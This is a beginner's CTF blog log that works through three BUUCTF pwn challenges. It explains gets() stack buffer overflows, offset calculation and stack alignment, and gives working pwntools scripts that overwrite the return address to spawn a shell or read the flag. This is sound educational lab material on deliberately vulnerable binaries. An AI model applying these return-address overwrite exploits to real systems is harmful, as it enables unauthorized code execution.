title: Learning to PWN
date: 2026-01-24 12:00:00
tags:
  - ctf 
  - Linux
  - safety
categories:
  - 技术
  - 折腾日志
---

During several previous ctf competitions, I could do a bit of every category except for pwn... So, this winter holiday, I decided to learn to pwn! It's actually really a lot of fun when you pwned it!

This blog keeps updating! I assume...

<!-- more -->

_Pwn_ basically means _own_, except for it's a typo of _own_ since `p` is close to `o` on the keyboard. We expect to gain unauthorized access to something by exploiting vulnerabilty, which is cool for its danger.

For anyone who want to pwn, i assume we should learn some assembly and basic computer system knowledge, if not, learn during the process and ask your favorite ai as much as possible. 

Anyway, let's start our journey of  learning to *PWN*! And by solving challenge I learn, which brings the most fun i guess!

### test_your_nc

https://files.buuoj.cn/files/643dec2806122d3fac330c9792d43b5d/test

To access remote we need `netcat`, this challenge is just a simple one that spawns a `/bin/sh` process after I throw it into ida. So, simply `nc ip port` and we gain access to a remote shell, then `cat /flag`!

### rip

rest in peace?

oh! it's actually the register that points to the next instruction.

https://files.buuoj.cn/files/96928d9cad0663625615b96e2970a30f/pwn1

throw it into ida, we could discover it's a program that calls `puts` `gets` and then 2 `puts` to repeat your input and plus an unused function called `fun` that spawns a `/bin/sh` process. Ok, seems we need to somehow trigger the program to run the `fun` function. let me look closely by inspecting its assembly code. run

```bash
objdump -d pwn1 | vim -
```

and the crucial part is as follows:

```assembly

0000000000401142 <main>:
  401142:	55                   	push   %rbp
  401143:	48 89 e5             	mov    %rsp,%rbp
  401146:	48 83 ec 10          	sub    $0x10,%rsp
  40114a:	48 8d 3d b3 0e 00 00 	lea    0xeb3(%rip),%rdi        # 402004 <_IO_stdin_used+0x4>
  401151:	e8 da fe ff ff       	call   401030 <puts@plt>
  401156:	48 8d 45 f1          	lea    -0xf(%rbp),%rax
  40115a:	48 89 c7             	mov    %rax,%rdi
  40115d:	b8 00 00 00 00       	mov    $0x0,%eax
  401162:	e8 e9 fe ff ff       	call   401050 <gets@plt>
  401167:	48 8d 45 f1          	lea    -0xf(%rbp),%rax
  40116b:	48 89 c7             	mov    %rax,%rdi
  40116e:	e8 bd fe ff ff       	call   401030 <puts@plt>
  401173:	48 8d 3d 97 0e 00 00 	lea    0xe97(%rip),%rdi        # 402011 <_IO_stdin_used+0x11>
  40117a:	e8 b1 fe ff ff       	call   401030 <puts@plt>
  40117f:	b8 00 00 00 00       	mov    $0x0,%eax
  401184:	c9                   	leave  
  401185:	c3                   	ret    

0000000000401186 <fun>:
  401186:	55                   	push   %rbp
  401187:	48 89 e5             	mov    %rsp,%rbp
  40118a:	48 8d 3d 8a 0e 00 00 	lea    0xe8a(%rip),%rdi        # 40201b <_IO_stdin_used+0x1b>
  401191:	e8 aa fe ff ff       	call   401040 <system@plt>
  401196:	90                   	nop
  401197:	5d                   	pop    %rbp
  401198:	c3                   	ret    
  401199:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

```

The program calls `gets()`. This function reads input from the user until it sees a newline character (\n). It does not check how much data is being entered. So, we can try to overwrite the return address to be the `fun` we try to trigger.
The Stack Layout:
  The buffer starts at rbp - 0xF (which is rbp - 15).
  The "Saved RBP" (Old Base Pointer) is stored at rbp.
  The Return Address (where the CPU jumps after main finishes) is stored at rbp + 0x8.
Calculating the Offset:
To overwrite the Return Address, we need to fill: 15 bytes (to get from buffer start to rbp) + 8 bytes (to overwrite the Saved RBP) = Total Offset: 23 bytes.
The 24th byte begins overwriting the Return Address.

cool! let me write the script to test it locally first!

```python
from pwn import *

# Set up the target
elf = ELF("./pwn1")
p = process("./pwn1") # Run locally for testing

# 1. Calculate the Offset
# We know from analysis it is 15 + 8 = 23
offset = 23

# 2. Get address of target function 'fun'
target_address = elf.symbols['fun'] 

# 3. Build the Payload
payload = b"A" * offset         # Padding to reach Return Address
payload += p64(target_address)  # Overwrite Return Address

# 4. Send Payload
p.recvuntil(b"input\n")
p.sendline(payload)  # Send the exploit
p.interactive()      # Give us the shell
```

however, running this get us a error `Process './pwn1' stopped with exit code -11 (SIGSEGV) (pid 4731)` it seems we encoutered `segmentation fault` i.e. run into a piece of memory we shouldn't have accessed. So, i asked ai. and it says

The Issue: On 64-bit Linux, the GLIBC system() function uses instructions (like movaps) that require the Stack Pointer (RSP) to be 16-byte aligned (address ends in 0). The Symptom: If you jump directly to the target function, the program crashes with SIGSEGV (Segmentation Fault) inside system() before giving a shell. The Fix: Add a `ret` instruction gadget before the target address. `ret` pops 8 bytes off the stack, shifting RSP by 8, toggling the alignment from "Misaligned" back to "Aligned".

cool! let's modify the script!

```python
from pwn import *

# Set up the target
elf = ELF("./pwn1")
p = process("./pwn1") # Run locally for testing
# p = remote("node5.buuoj.cn", 25564) # Connect to server

# 1. Calculate the Offset
# We know from analysis it is 15 + 8 = 23
offset = 23

# 2. Get address of target function 'fun'
target_address = elf.symbols['fun'] # 0x401186

# 3. Stack Alignment
ret_gadget = 0x401016  # an address of ret instruction

# 4. Build the Payload
payload = b"A" * offset         # Padding to reach Return Address
payload += p64(ret_gadget)  
payload += p64(target_address)  # Overwrite Return Address

# 5. Send Payload
p.recvuntil(b"input\n")
p.sendline(payload)  # Send the exploit
p.interactive()      # Give us the shell
```

however for remote exploiting, payload sending logic is not working well... due to buffering, `p.recvuntil(b"input\n")` is not working we may delete that and add a simple `sleep(1)`. cool! problem solved!

### warmup_csaw_2016

https://files.buuoj.cn/files/dcd3c0cc561089a3969fba10d626ccf6/warmup_csaw_2016

throw it into ida, and decompile it. let's see what we got.

of course, the first to inspect is main function

```cpp
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAu);
  write(1, "WOW:", 4u);
  sprintf(s, "%p\n", sub_40060D);
  write(1, s, 9u);
  write(1, ">", 1u);
  return gets(v5);
}
```

of course we're curious about what's `sub_40060D`

```cpp
int sub_40060D()
{
  return system("cat flag.txt");
}
```

so the main function prints the address of the targetted function otherwise due to the modern ASLR and PIE, we would have to guess. and this `gets` function shall be how we trigger the targetted function.

look closely into the assembly code:

```assembly
400692:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
400696:	48 89 c7             	mov    %rax,%rdi
400699:	b8 00 00 00 00       	mov    $0x0,%eax
40069e:	e8 5d fe ff ff       	call   400500 <gets@plt>
4006a3:	c9                   	leave  
4006a4:	c3                   	ret    
```

then we might know we just need to overwrite 64 bytes of buffer and 8 bytes of saved `%rbp` then write the address of the targeted function. let's code the script! 

```python
from pwn import *

elf = ELF("./warmup_csaw_2016")
p = process("./warmup_csaw_2016")
# or remotely p = remote("node5.buuoj.cn",26871)

offset = 72

p.recvuntil(b"WOW:")

address_string = p.recvline().strip()

target_address = int(address_string, 16)

print(target_address)

ret_gadget = 0x4004a1

payload = b"A" * offset + p64(ret_gadget) + p64(target_address)

p.recvuntil(b">")
p.sendline(payload)
output = p.recvall()
print(output.decode())
```

notice we also add `ret_gadget` here, we didn't `call` main function, so, different from calling `system()` function normally, we lack the step of pushing return address. And thus we had 8 bytes misalignment.
